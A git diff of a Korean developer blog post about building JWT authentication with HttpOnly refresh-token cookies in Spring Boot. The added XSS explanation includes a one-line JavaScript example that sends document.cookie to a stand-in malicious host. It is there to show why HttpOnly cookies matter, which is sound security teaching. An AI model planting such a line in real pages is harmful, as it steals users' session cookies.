@@ -1,5 +1,5 @@
 ---
-title: "시대팅에 JWT 인증 시스템을 구축하기까지"
+title: "시대팅에 JWT 인증 시스템 구축하기"
 date: 2024-12-18T08:00:00.000Z
 categories: [Project, 시대팅5]
 tags: [spring-boot, jwt, cookie]
@@ -193,17 +193,29 @@ fun getAuthenticatedUserId(token: String): Long {
 
 ### Refresh Token
 
-**HttpOnly 쿠키**
-
 ![httponly cookie slack](/assets/img/project/sidaeting5/03-jwt/slack-httponly-cookie.png)
 _프론트엔드 팀원과의 논의_
 
-기존 어카운트 서버는 액세스 토큰, 리프레시 토큰 모두 응답 DTO에 담아서 반환하였다. 하지만 이러한 방식이 토큰 탈취의 위험성이 있다는 의견으로 이번 프로젝트에서는 **HttpOnly 쿠키**를 사용하여 리프레시 토큰을 관리하기로 결정했다.
+기존 어카운트 서버는 액세스 토큰과 리프레시 토큰을 모두 응답 DTO에 담아서 반환했다. 하지만 이러한 방식이 토큰 탈취의 위험성이 있다는 의견이 있어 이번 프로젝트에는 **HttpOnly 쿠키**를 사용하여 리프레시 토큰을 관리하기로 결정했다.
 
-HttpOnly 쿠키는 자바스크립트를 통해 접근할 수 없기 때문에 **XSS(Cross-Site Scripting) 공격**으로부터 토큰을 보호할 수 있다. 추가로 다음과 같은 보안 설정을 적용했다.
+**HttpOnly 쿠키**
 
-- `Secure` 플래그를 통해 HTTPS 연결에서만 쿠키가 전송되도록 설정
-- `SameSite=None` 설정으로 크로스 사이트 요청 시에도 쿠키가 전송되도록 구성
+HttpOnly 쿠키는 서버에서 설정한 특별한 속성의 쿠키로, **클라이언트 측 스크립트(JavaScript)에서 접근이 불가능**하다. 일반 쿠키는 `document.cookie`를 통해 JavaScript로 접근할 수 있지만, HttpOnly 쿠키는 **오직 HTTP(S) 요청**을 통해서만 서버로 전송된다. 이러한 특성으로 인해 **XSS 공격**으로부터 토큰을 효과적으로 보호할 수 있다.
+
+- **XSS(Cross-Site Scripting) 공격**
+
+  XSS 공격은 웹 애플리케이션의 취약점을 이용하여 사용자의 **브라우저에 악성 스크립트를 주입**하는 공격이다. 예를 들어, 다음과 같은 스크립트를 게시판에 삽입하여 사용자의 쿠키 정보를 탈취할 수 있다.
+
+  ```js
+  new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
+  ```
+
+  이 스크립트는 새로운 이미지 객체를 생성하고 악성 서버의 URL을 이미지 소스로 설정한다. URL에는 사용자의 쿠키 정보가 쿼리 파라미터로 포함되어 있어, 브라우저가 이미지를 로드하려 할 때 쿠키 정보가 자동으로 악성 서버로 전송된다.
+
+추가로 다음과 같은 보안 설정을 적용했다.
+
+- `Secure` 플래그를 통해 **HTTPS 연결**에서만 쿠키가 전송되도록 설정
+- `SameSite=None` 설정으로 **크로스 사이트 요청** 시에도 쿠키가 전송되도록 구성
 - **URL 인코딩**을 통해 특수문자로 인한 문제 방지
 
 **쿠키 관리 유틸리티**
@@ -322,5 +334,8 @@ fun reissueTokens(request: HttpServletRequest): JwtResponse {
 
 - [JSON Web Token Introduction - jwt.io](https://jwt.io/introduction)
 - [JWT vs Session Authentication - DEV Community](https://dev.to/codeparrot/jwt-vs-session-authentication-1mol)
+- [Using HTTP cookies - HTTP \| MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
+- [Document: cookie property - Web APIs \| MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
+- [Cookies and security - Human Who Codes](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/)
 - [[Spring] jwt토큰을 더 안전하게 ! (RefreshToken , Cookie) — sudoSoooooo](https://soobysu.tistory.com/67)
 - [node.js - How to extract token string from Bearer token? - Stack Overflow](https://stackoverflow.com/questions/50284841/how-to-extract-token-string-from-bearer-token)
